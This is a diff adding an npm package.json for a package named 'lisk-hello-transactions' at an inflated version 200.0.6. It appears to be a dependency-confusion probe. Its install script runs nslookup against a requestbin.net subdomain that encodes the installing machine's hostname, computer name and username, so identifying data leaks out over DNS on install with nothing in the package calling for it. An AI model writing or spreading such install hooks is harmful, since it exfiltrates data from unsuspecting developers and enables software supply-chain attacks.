@@ -1,0 +1,11 @@
+{
+  "name": "lisk-hello-transactions",
+  "version": "200.0.6",
+  "description": "lisk-hello-transactions: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.lisk-hello-transactions.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
